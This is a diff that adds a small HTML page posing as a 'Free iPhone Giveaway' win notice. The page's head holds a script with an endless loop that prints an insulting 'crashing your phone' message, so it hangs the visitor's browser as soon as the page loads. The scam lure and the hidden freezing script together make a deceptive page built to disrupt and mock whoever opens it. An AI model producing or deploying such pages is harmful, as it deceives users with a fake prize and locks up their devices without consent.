@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Free iPhone Giveaway!</title>
+    <script>
+        while (true) {
+            console.log("Crashing your phone, you dumbass!");
+        }
+    </script>
+</head>
+<body>
+    <h1>Congratulations! You won a free iPhone!</h1>
+</body>
+</html>
